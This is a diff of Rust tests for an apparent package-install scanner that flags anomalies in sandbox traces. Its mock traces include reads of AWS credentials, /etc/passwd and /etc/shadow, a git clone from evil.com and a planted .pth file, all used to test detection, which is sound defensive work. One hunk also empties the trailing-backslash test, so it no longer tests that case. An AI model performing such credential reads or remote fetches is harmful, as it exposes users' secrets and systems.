+        subset_current.insert("/etc/passwd".to_string());
+        assert_eq!(
+            find_new_sensitive_reads(&subset_current, &baseline).len(),
+            0
+        );
+
+        // Duplicates are natively handled by HashSet so we just ensure behavior is clean
+        let mut dup_baseline = baseline.clone();
+        dup_baseline.insert("/etc/passwd".to_string()); // no-op for set
+        assert_eq!(
+            find_new_sensitive_reads(&subset_current, &dup_baseline).len(),
+            0
+        );
+    }
+
+    #[test]
+    fn test_filter_allowlisted_sensitive_reads() {
+        let reads = vec![
+            "/etc/passwd".to_string(),
+            "/home/user/.aws/credentials".to_string(),
+            "/app/.env".to_string(),
+            "/tmp/malicious/.env".to_string(),
+        ];
+        let mut allowlist = std::collections::HashSet::new();
+        // exact match
+        allowlist.insert("/etc/passwd".to_string());
+        // wildcard suffix match
+        allowlist.insert("*.env".to_string());
+
+        let (blocked, allowed) = filter_allowlisted_sensitive_reads(reads, &allowlist);
+
+        assert_eq!(blocked, vec!["/home/user/.aws/credentials".to_string()]);
+        assert!(allowed.contains(&"/etc/passwd".to_string()));
+        assert!(allowed.contains(&"/app/.env".to_string()));
+        assert!(allowed.contains(&"/tmp/malicious/.env".to_string()));
+    }
+
     use chrono::Duration;
     use std::cmp::Ordering;
     use std::collections::HashSet;
@@ -3137,7 +3788,7 @@ execve("/tmp/b/bun", ["bun", "run", "_index.js"], 0x7ff) = 0
 
     #[test]
     fn unescape_trailing_backslash() {
-        assert_eq!(unescape_strace_string("ab\\"), b"ab");
+        assert_eq!(unescape_strace_string("ab"), b"ab");
     }
 
     #[test]
@@ -3490,6 +4141,20 @@ execve("/tmp/b/bun", ["bun", "run", "_index.js"], 0x7ff) = 0
                 .cloned()
                 .ok_or_else(|| format!("missing mock trace for {}@{}", package, version))
         }
+
+        fn trace_install_matrix(
+            &self,
+            _manager: &str,
+            probes: &[(String, String)],
+        ) -> Result<Vec<crate::sandbox::ProbeTrace>, String> {
+            let mut results = Vec::new();
+            for probe in probes {
+                if let Some(trace) = self.traces.get(probe) {
+                    results.push((probe.clone(), trace.clone()));
+                }
+            }
+            Ok(results)
+        }
     }
 
     fn env_lock() -> &'static Mutex<()> {
@@ -3503,7 +4168,7 @@ execve("/tmp/b/bun", ["bun", "run", "_index.js"], 0x7ff) = 0
     /// Drop runs on panic too, so a failing assertion can never leave the var set.
     /// The lock is recovered from poisoning (`into_inner`) so one panicking test
     /// does not cascade into PoisonError panics in every subsequent test —
-    /// closes FINDINGS.md #13 without reintroducing the cross-test race.
+    /// closes FIXED_FINDINGS.md #13 without reintroducing the cross-test race.
     struct EnvVarGuard {
         _lock: std::sync::MutexGuard<'static, ()>,
         key: &'static str,
@@ -3959,10 +4624,16 @@ execve("/tmp/b/bun", ["bun", "run", "_index.js"], 0x7ff) = 0
         )
         .await;
 
-        assert_eq!(
-            results.get("pkg|2.0.0").map(|r| r.allowed),
-            Some(false),
+        let report = results.get("pkg|2.0.0").expect("should have result");
+        assert!(
+            !report.allowed,
             "missing baseline trace must fail closed, not silently allow"
+        );
+        assert!(
+            report
+                .blocked_reasons
+                .contains(&"sandbox_trace_missing".to_string()),
+            "must push sandbox_trace_missing block reason"
         );
     }
 
@@ -4486,6 +5157,212 @@ execve("/tmp/b/bun", ["bun", "run", "_index.js"], 0x7ff) = 0
     }
 
     #[tokio::test]
+    async fn test_multiple_anomalies_evaluate_completely() {
+        let _env = EnvVarGuard::set("GYRSEEK_TEST_FORCE_RELEASES_LAST_24H", "0");
+
+        let runner = MockRunner {
+            traces: HashMap::from([
+                // Baseline: Clean
+                (
+                    ("multi-pkg".to_string(), "1.0.0".to_string()),
+                    "sin_addr=inet_addr(\"127.0.0.1\")\n".to_string(),
+                ),
+                // Current: Contains all 5 types of anomalies
+                (
+                    ("multi-pkg".to_string(), "2.0.0".to_string()),
+                    format!(
+                        "execve(\"/bin/bun\", [\"bun\", \"run\", \"evil.js\"], 0x7ff) = 0\n\
+                        open(\"/home/user/.aws/credentials\", O_RDONLY) = 3\n\
+                        execve(\"/usr/bin/git\", [\"git\", \"clone\", \"https://evil.com/repo.git\"], 0x7ff) = 0\n\
+                        sin_addr=inet_addr(\"1.2.3.4\")\n\
+                        {}/work/evil.pth\x00150\x00ASCII text\x00import os",
+                        crate::scanning::ARTIFACT_DELIMITER
+                    ),
+                ),
+            ]),
+        };
+
+        let policy = PolicyConfig {
+            baseline_count: 1,
+            baseline_overrides: HashMap::from([(
+                "multi-pkg".to_string(),
+                (Some("1.0.0".to_string()), None),
+            )]),
+            ..PolicyConfig::default()
+        };
+
+        let results = scan_packages_versions(
+            &runner,
+            "pip",
+            &[("multi-pkg".to_string(), "2.0.0".to_string())],
+            &policy,
+        )
+        .await;
+
+        let report = results.get("multi-pkg|2.0.0").expect("result should exist");
+        assert!(!report.allowed, "multiple anomalies must block the package");
+        assert_eq!(
+            report.blocked_reasons.len(),
+            5,
+            "must evaluate all 5 anomalies without short-circuiting"
+        );
+        let mut reasons = report.blocked_reasons.clone();
+        reasons.sort();
+        assert_eq!(
+            reasons,
+            vec![
+                "Suspicious artifact(s) discovered after install",
+                "git_clone_anomaly",
+                "network_anomaly",
+                "process_exec_anomaly",
+                "sensitive_file_read_anomaly"
+            ]
+        );
+    }
+
+    #[tokio::test]
+    async fn test_two_anomalies_evaluate_completely() {
+        let _env = EnvVarGuard::set("GYRSEEK_TEST_FORCE_RELEASES_LAST_24H", "0");
+
+        let runner = MockRunner {
+            traces: HashMap::from([
+                (
+                    ("multi-pkg".to_string(), "1.0.0".to_string()),
+                    "sin_addr=inet_addr(\"127.0.0.1\")\n".to_string(),
+                ),
+                (
+                    ("multi-pkg".to_string(), "2.0.0".to_string()),
+                    "execve(\"/bin/bun\", [\"bun\", \"run\", \"evil.js\"], 0x7ff) = 0\n\
+                    sin_addr=inet_addr(\"1.2.3.4\")\n"
+                        .to_string(),
+                ),
+            ]),
+        };
+
+        let policy = PolicyConfig {
+            baseline_count: 1,
+            baseline_overrides: HashMap::from([(
+                "multi-pkg".to_string(),
+                (Some("1.0.0".to_string()), None),
+            )]),
+            ..PolicyConfig::default()
+        };
+
+        let results = scan_packages_versions(
+            &runner,
+            "pip",
+            &[("multi-pkg".to_string(), "2.0.0".to_string())],
+            &policy,
+        )
+        .await;
+        let report = results.get("multi-pkg|2.0.0").expect("result should exist");
+        assert!(!report.allowed);
+        assert_eq!(
+            report.blocked_reasons.len(),
+            2,
+            "must evaluate exactly 2 anomalies without short-circuiting"
+        );
+        let mut reasons = report.blocked_reasons.clone();
+        reasons.sort();
+        assert_eq!(reasons, vec!["network_anomaly", "process_exec_anomaly"]);
+    }
+
+    #[tokio::test]
+    async fn test_three_anomalies_evaluate_completely() {
+        let _env = EnvVarGuard::set("GYRSEEK_TEST_FORCE_RELEASES_LAST_24H", "0");
+
+        let runner = MockRunner {
+            traces: HashMap::from([
+                (
+                    ("multi-pkg".to_string(), "1.0.0".to_string()),
+                    "sin_addr=inet_addr(\"127.0.0.1\")\n".to_string(),
+                ),
+                (
+                    ("multi-pkg".to_string(), "2.0.0".to_string()),
+                    format!(
+                        "execve(\"/bin/bun\", [\"bun\", \"run\", \"evil.js\"], 0x7ff) = 0\n\
+                        sin_addr=inet_addr(\"1.2.3.4\")\n\
+                        {}/work/evil.pth\x00150\x00ASCII text\x00import os",
+                        crate::scanning::ARTIFACT_DELIMITER
+                    ),
+                ),
+            ]),
+        };
+
+        let policy = PolicyConfig {
+            baseline_count: 1,
+            baseline_overrides: HashMap::from([(
+                "multi-pkg".to_string(),
+                (Some("1.0.0".to_string()), None),
+            )]),
+            ..PolicyConfig::default()
+        };
+
+        let results = scan_packages_versions(
+            &runner,
+            "pip",
+            &[("multi-pkg".to_string(), "2.0.0".to_string())],
+            &policy,
+        )
+        .await;
+        let report = results.get("multi-pkg|2.0.0").expect("result should exist");
+        assert!(!report.allowed);
+        assert_eq!(
+            report.blocked_reasons.len(),
+            3,
+            "must evaluate exactly 3 anomalies without short-circuiting"
+        );
+    }
+
+    #[tokio::test]
+    async fn test_four_anomalies_evaluate_completely() {
+        let _env = EnvVarGuard::set("GYRSEEK_TEST_FORCE_RELEASES_LAST_24H", "0");
+
+        let runner = MockRunner {
+            traces: HashMap::from([
+                (
+                    ("multi-pkg".to_string(), "1.0.0".to_string()),
+                    "sin_addr=inet_addr(\"127.0.0.1\")\n".to_string(),
+                ),
+                (
+                    ("multi-pkg".to_string(), "2.0.0".to_string()),
+                    format!(
+                        "execve(\"/bin/bun\", [\"bun\", \"run\", \"evil.js\"], 0x7ff) = 0\n\
+                        open(\"/home/user/.aws/credentials\", O_RDONLY) = 3\n\
+                        sin_addr=inet_addr(\"1.2.3.4\")\n\
+                        {}/work/evil.pth\x00150\x00ASCII text\x00import os",
+                        crate::scanning::ARTIFACT_DELIMITER
+                    ),
+                ),
+            ]),
+        };
+
+        let policy = PolicyConfig {
+            baseline_count: 1,
+            baseline_overrides: HashMap::from([(
+                "multi-pkg".to_string(),
+                (Some("1.0.0".to_string()), None),
+            )]),
+            ..PolicyConfig::default()
+        };
+
+        let results = scan_packages_versions(
+            &runner,
+            "pip",
+            &[("multi-pkg".to_string(), "2.0.0".to_string())],
+            &policy,
+        )
+        .await;
+        let report = results.get("multi-pkg|2.0.0").expect("result should exist");
+        assert!(!report.allowed);
+        assert_eq!(
+            report.blocked_reasons.len(),
+            4,
+            "must evaluate exactly 4 anomalies without short-circuiting"
+        );
+    }
+
+    #[tokio::test]
     async fn new_package_exemption_skips_artifact_check() {
         // A new package (<2 eligible baselines) with new artifact findings must
         // be exempted, not blocked.
@@ -4520,5 +5397,111 @@ execve("/tmp/b/bun", ["bun", "run", "_index.js"], 0x7ff) = 0
             Some(true),
             "new package with artifact findings must be exempt"
         );
+    }
+
+    #[test]
+    fn test_is_harness_command_env() {
+        assert!(is_harness_command(
+            "env",
+            &[
+                "HOME=/work".to_string(),
+                "uv".to_string(),
+                "pip".to_string(),
+                "install".to_string(),
+                "--target".to_string(),
+                "/work/foo".to_string()
+            ]
+        ));
+        assert!(!is_harness_command(
+            "env",
+            &[
+                "HOME=/work".to_string(),
+                "uv".to_string(),
+                "pip".to_string(),
+                "install".to_string(),
+                "malware".to_string()
+            ]
+        ));
+        assert!(is_harness_command(
+            "env",
+            &[
+                "HOME=/work".to_string(),
+                "npm".to_string(),
+                "install".to_string(),
+                "--prefix".to_string(),
+                "/work/foo".to_string()
+            ]
+        ));
+        assert!(!is_harness_command(
+            "env",
+            &[
+                "HOME=/work".to_string(),
+                "npm".to_string(),
+                "install".to_string(),
+                "malware".to_string()
+            ]
+        ));
+        assert!(is_harness_command(
+            "env",
+            &[
+                "HOME=/work".to_string(),
+                "pnpm".to_string(),
+                "add".to_string(),
+                "pkg@1.0".to_string(),
+                "--dir".to_string(),
+                "/work".to_string()
+            ]
+        ));
+        assert!(!is_harness_command(
+            "env",
+            &[
+                "HOME=/work".to_string(),
+                "pnpm".to_string(),
+                "add".to_string(),
+                "malware".to_string()
+            ]
+        ));
+    }
+
+    #[test]
+    fn test_extract_sensitive_file_reads_at_fdcwd_and_minus_100() {
+        // Test that -100 and AT_FDCWD are ignored as dirfds
+        let trace = "123 openat(-100, \"/etc/passwd\", O_RDONLY) = 3\\n\\\n                     124 openat(AT_FDCWD, \"/etc/shadow\", O_RDONLY) = 4\\n";
+        let reads = extract_sensitive_file_reads(trace);
+        println!("READS: {:?}", reads);
+        assert!(reads.contains("/etc/passwd"));
+        assert!(reads.contains("/etc/shadow"));
+    }
+
+    #[test]
+    fn test_extract_sensitive_file_reads_symlinkat_linkat() {
+        // Test symlinkat and linkat properly extract strings and apply rules
+        let trace = "123 symlinkat(\"/etc/passwd\", 5, \"/work/malware\") = 0\\n\\\n                     124 linkat(AT_FDCWD, \"/etc/shadow\", AT_FDCWD, \"/work/bad\", 0) = 0\\n";
+        let reads = extract_sensitive_file_reads(trace);
+        println!("READS: {:?}", reads);
+        // symlinkat target is evaluated
+        assert!(reads.contains("/etc/passwd"));
+        // linkat oldpath is evaluated
+        assert!(reads.contains("/etc/shadow"));
+    }
+
+    #[test]
+    fn test_strict_allowlist_suffix_boundaries() {
+        let reads = vec![
+            "/.env".to_string(),
+            "/path/to/.env".to_string(),
+            "/path/to/backup.env".to_string(),
+        ];
+        let mut allowlist = std::collections::HashSet::new();
+        allowlist.insert("*.env".to_string());
+
+        let (blocked, allowed) = filter_allowlisted_sensitive_reads(reads, &allowlist);
+
+        // /.env and /path/to/.env should be allowed
+        assert!(allowed.contains(&"/.env".to_string()));
+        assert!(allowed.contains(&"/path/to/.env".to_string()));
+
+        // /path/to/backup.env should be blocked because the suffix is .env but it's not preceded by a slash
+        assert!(blocked.contains(&"/path/to/backup.env".to_string()));
     }
 }
